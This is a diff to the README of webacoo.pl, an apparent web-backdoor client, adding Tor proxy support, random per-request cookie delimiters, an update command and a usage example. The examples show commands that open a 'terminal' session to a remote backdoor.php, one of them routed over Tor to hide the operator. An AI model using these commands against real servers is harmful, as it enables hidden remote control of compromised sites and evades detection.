@@ -24,6 +24,9 @@ Any modifications, changes, or alterations to this application is acceptable, ho
 Requirements
 ============
 * liburi-perl
+* libio-socket-socks-perl
+
+If you do not want to install "libio-socket-socks-perl" for Tor proxy feature, comment line 9 at webacoo.pl
 
 Usage
 =====
@@ -48,13 +51,13 @@ Options:
 
   -u URL	Backdoor URL
 
-  -c C_NAME	Cookie name (default "M-cookie")
+  -c C_NAME	Cookie name (default: "M-cookie")
 
-  -d DELIM	Delimiter (default "wBc")
+  -d DELIM	Delimiter (default: New random for each request)
 
   -a AGENT	HTTP header user-agent (default exist)
 
-  -p PROXY	Use proxy (IP:PORT or USER:PASS:IP:PORT)
+  -p PROXY	Use proxy (tor, ip:port or user:pass:ip:port)
 
   -v LEVEL	Verbose level
 	LEVEL
@@ -63,6 +66,8 @@ Options:
 		2: print HTTP headers + data
 
   -h		Display help and exit
+
+  update	Check for updates and apply if any
 
 
 Examples
@@ -85,3 +90,6 @@ Examples
 
 6. Establish "terminal" connection with remote host through http proxy with basic auth
 ./webacoo.pl -t -u http://10.0.1.13/backdoor.php -p user:password:10.0.1.8:3128
+
+7. Establish "terminal" connection with remote host over Tor
+./webacoo.pl -t -u http://example.com/backdoor.php -p tor
